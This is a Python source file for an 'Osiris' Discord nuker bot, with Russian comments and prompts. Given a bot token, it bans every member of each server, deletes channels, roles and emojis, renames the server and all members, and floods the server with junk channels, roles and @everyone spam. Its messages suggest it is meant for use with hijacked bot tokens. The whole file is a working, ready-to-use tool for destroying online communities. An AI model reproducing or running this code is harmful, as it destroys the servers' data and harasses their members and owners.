import ctypes
import discord
import os
import random
import string
import sys
from discord.ext import commands

kernel32 = ctypes.windll.kernel32
kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)

R = "\033[31m"  # Красный
G = "\033[32m"  # Зелёный
Y = "\033[33m"  # Желтый
W = "\033[37m"  # Белый


def banner():
    print(f"\n\n{Y}"
          "\t\t\t╭━╮           ╭━━━━━╮╭━━━━╮╭━━━╮╭━━━━━╮ ╭━━━╮╭━━━━╮\n"
          "\t\t\t┃ ┃           ┃ ╭━╮ ┃┃ ╭━━╯╰┫ ┣╯┃ ╭━╮ ┃ ╰┫ ┣╯┃ ╭━━╯\n"
          "\t\t\t┃ ╰━━╮╭━╮ ╭━╮ ┃ ┃ ┃ ┃┃ ╰━━╮ ┃ ┃ ┃ ╰━╯ ┃  ┃ ┃ ┃ ╰━━╮\n"
          "\t\t\t┃ ╭╮ ┃┃ ┃ ┃ ┃ ┃ ┃ ┃ ┃╰━━╮ ┃ ┃ ┃ ┃ ╭━╮╭╯  ┃ ┃ ╰━━╮ ┃\n"
          "\t\t\t┃ ╰╯ ┃┃ ╰━╯ ┃ ┃ ╰━╯ ┃╭━━╯ ┃╭┫ ┣╮┃ ┃ ┃╰━╮╭┫ ┣╮╭━━╯ ┃\n"
          "\t\t\t╰━━━━╯╰━━╮ ╭╯ ╰━━━━━╯╰━━━━╯╰━━━╯╰━╯ ╰━━╯╰━━━╯╰━━━━╯\n"
          "\t\t\t       ╭━╯ ┃        github.com/N0t-Ex1st\n"
          "\t\t\t       ╰━━━╯\n\n" + W)


def help_banner():
    print("\t\t\t\t\t╭━╮ ╭━╮╭━━━━╮╭━╮    ╭━━━━━╮\n"
          "\t\t\t\t\t┃ ┃ ┃ ┃┃ ╭━━╯┃ ┃    ┃ ╭━╮ ┃\n"
          "\t\t\t\t\t┃ ╰━╯ ┃┃ ╰━━╮┃ ┃    ┃ ╰━╯ ┃\n"
          "\t\t\t\t\t┃ ╭━╮ ┃┃ ╭━━╯┃ ┃ ╭━╮┃ ╭━━━╯\n"
          "\t\t\t\t\t┃ ┃ ┃ ┃┃ ╰━━╮┃ ╰━╯ ┃┃ ┃\n"
          "\t\t\t\t\t╰━╯ ╰━╯╰━━━━╯╰━━━━━╯╰━╯\n\n")


def main(t, m, p, txt, n):
    client = commands.Bot(command_prefix='!', intents=discord.Intents.all())

    if m == "0":
        @client.event
        async def on_ready():
            for gi in client.guilds:
                print(f"Начинаю уничтожение сервера {gi.name}")
                await ban(gi)
                await servn(gi)
                await delch(gi)
                await delr(gi)
                await dele(gi)
                await namech(gi, n)
                await chspam(gi)
                await rspam(gi)
                await spam(gi, txt)
    if m == "1":
        print("Жду комманду !nuke")

        @client.command()
        async def nuke(ctx):
            arg = ctx.guild
            for part in p:
                await servn(arg)
                if part == "f":
                    await ban(arg)
                    await delch(arg)
                    await delr(arg)
                    await dele(arg)
                    await namech(arg, n)
                    await chspam(arg)
                    await rspam(arg)
                    await spam(arg, txt)
                elif part == "b":
                    await ban(arg)
                elif part == "dc":
                    await delch(arg)
                elif part == "dr":
                    await delr(arg)
                elif part == "de":
                    await dele(arg)
                elif part == "s":
                    await spam(arg, txt)
                elif part == "nc":
                    await namech(arg, n)
                elif part == "cs":
                    await chspam(arg)
                elif part == "rs":
                    await rspam(arg)

    try:
        client.run(t)
    except RuntimeError:
        print(f"\n\n{R}Токен сменили, веселье закончилось({W}")
        sys.exit()
    except Exception as ex:
        if str(ex) == "Shard ID None WebSocket closed with 4004":
            print(f"{R}Токен сменили, веселье закончилось({W}")
        elif "Shard ID None is requesting privileged intents" in str(ex):
            print(f"{R}У бота выключены intents. Включите их во вкладке Bot на сайте, если это токен вашего бота{W}")
        else:
            print(f"\n{R}Неизвестная ошибка!\nНапишите help в аргумент, для помощи.{W}")
            print(R + "\nERROR!!!   " + str(ex) + W)
        sys.exit()
    except KeyboardInterrupt:
        print(f"\n\n{G}Спасибо за использование нюкера, надеюсь вам понравилось!{W}")
        sys.exit()


async def ban(guild):
    ppl = 0
    bn = 0
    try:
        print("> Начинаем зачистку людей...")
        for member in guild.members:
            try:
                ppl += 1
                await member.ban()
                bn += 1
                print(f"В бан чертика: {member}")
            except:
                print(f"{R}{member} - слишком силен{W}")
                continue

            print(f"> Было {ppl}  человек, забанил {bn} человек.")
    except:
        print(f"{R}Не смог забанить{W}")


async def servn(guild):
    try:
        await guild.edit(name="Hello from Osiris!")
        print("> Теперь имя сервера другое!)")
    except:
        print(f"{R}Не смог поменять имя сервера{W}")


async def delch(guild):
    try:
        ch = 0
        chd = 0
        print("> Чистим каналы...")
        for channel in guild.channels:
            ch += 1
            try:
                await channel.delete()
                print(f"Удалил {channel}")
                chd += 1
            except:
                print(f"{R}Не удалось удалить {channel}{W}")
                continue
        print(f"> Было {ch} каналов, удаленно {chd} каналов.")
    except:
        print(f"{R}Не удалить каналы{W}")


async def delr(guild):
    try:
        print("> Теперь удалим роли...")
        roles = guild.roles
        roles.pop(0)
        for role in roles:
            if guild.me.roles[-1] > role:
                try:
                    await role.delete()
                    print(f" Удалил {role}")
                except:
                    print(f"{R} Не смог удалить {role}{W}")
                    continue
            else:
                break
        print("> Удалил роли.")
    except:
        print(f"{R}Не смог удалить роли{W}")


async def dele(guild):
    try:
        counter = 0
        for emoji in list(guild.emojis):
            await emoji.delete()
            counter += 1
            print("Удалил смайлик", counter, end="\r")
        print("Удалил смайлик", counter)
        print("> Все, смайлов больше нет....")
    except:
        print(f"{R}Не смог удалить смайлики{W}")


async def namech(guild, n):
    try:
        print("> Начинаем маскарад...")

        def name_gen(nick):
            if nick == "":
                char = string.ascii_letters + string.digits
                return ''.join((random.choice(char) for _ in range(16)))
            else:
                return nick

        for member in guild.members:
            a = name_gen(n)
            try:
                await member.edit(nick=a)
                print(
                    f"Поменял имя {member} на {a}")
            except:
                print(f"{R}Не смог поменять имя {member}{W}")
        print("> Все теперь анонизмусы.")
    except:
        print(f"> {R}Не смог поменять имена{W}")


async def chspam(guild):
    try:
        counter = 0
        print("> Начинаем создавать каналы")
        for b in range(10):
            await guild.create_text_channel("Hello from Osiris!")
            counter += 1
            print("Создал ", counter, " канала(ов)", end="\r")
        print("Создал ", counter, " канала(ов)")
        print("> Каналы созданны")
    except:
        print(f"> {R}Не смог создать каналы{W}")


async def rspam(guild):
    try:
        counter = 0
        print("> Спамим ролями")
        for a in range(100):
            await guild.create_role(name="Hello from Osiris!")
            counter += 1
            print("Создал ", counter, " ролей", end="\r")
        print("Создал", counter, " ролей")
        print("> Наcпамил ролями...")
    except:
        print(f"> {R}Не смог наспамить ролями{W}")


async def spam(guild, stext):
    try:
        print("> Спам активирован")
        for r in range(2):
            for channel in guild.text_channels:
                await channel.send("@everyone " + stext)
    except:
        print(f"> {R}Не смог наспамить{W}")


if __name__ == "__main__":
    os.system('cls')
    try:
        if sys.argv[1] == "help":
            help_banner()
            print("Режимы нюкера:\n\tРучной - настраиваемый режим, можно запустить командой на сервере."
                  "\n\tАвтоматический - выполнит фулл нюк(см. ниже) на всех серверах.\n\nДействия "
                  "нюкера: \n\tf - full nuke - Автоматическое использование всех режимов.\n\tb - ban - Бан всех "
                  "участников, которых сможет забанить бот.\n\tdc - del channels - Удаление всех каналов."
                  "\n\tdr - del roles - Удаление всех ролей, которые сможет бот.\n\ts - spam - Спам и пинг во всех"
                  " каналах.\n\tnc - name change - Изменение имени всем участникам сервера на случайные/выбранное.\n\t"
                  "de - del emoji - Удаление всех эмоджи на сервере.\n\tcs - channels spam - Создание большого кол-ва"
                  " пустых каналов.\n\trs - roles spam - Создание большого кол-ва бесполезных ролей.")
        else:
            print(f"{R}Введен не верный аргумент{W}")
    except:
        try:
            banner()
            parts = text = name = None
            parts_list = ["f", "b", "dc", "dr", "de", "s", "nc", "cs", "rs"]
            token = input("Введите токен: ")
            if len(token) != 70:
                raise Exception("token")
            mode = input("Введите режим (авто - 0, ручной - 1): ")
            if mode != "0" and mode != "1":
                raise Exception("mode")
            if mode == "1":
                parts = input("Введите действия нюкера(см. help, вводить через запятую): ").split(",")
                for i in parts:
                    if i not in parts_list:
                        raise Exception("parts")
                    if i == "s" or i == "f":
                        text = input("Введите текст для спама(Enter - автоспам): ")
                    if i == "nc" or i == "f":
                        name = input("Введите имя для людишек(Enter - рандомное): ")
            elif mode == "0":
                text = input("Введите текст для спама(Enter - автоспам): ")
                name = input("Введите имя для людишек(Enter - рандомное): ")
            main(token, mode, parts, text, name)

        except Exception as e:
            if str(e) == "token":
                print(f"\n{R}Введен не верный токен!\nНапишите help в аргумент, для помощи.{W}")
            elif str(e) == "parts":
                print(f"\n{R}Введен(ы) не верный(е) действия нюкера!\nНапишите help в аргумент, для помощи.{W}")
            elif str(e) == "mode":
                print(f"\n{R}Введен не верный режим нюкера!\nНапишите help в аргумент, для помощи.{W}")
            else:
                print(f"\n{R}Неизвестная ошибка!\nНапишите help в аргумент, для помощи.{W}")
                print(R + "\nERROR!!! " + str(e) + W)
            sys.exit()

        except KeyboardInterrupt:
            print(f"\n\n{G}Спасибо за использование нюкера, надеюсь вам понравилось!{W}")
            sys.exit()
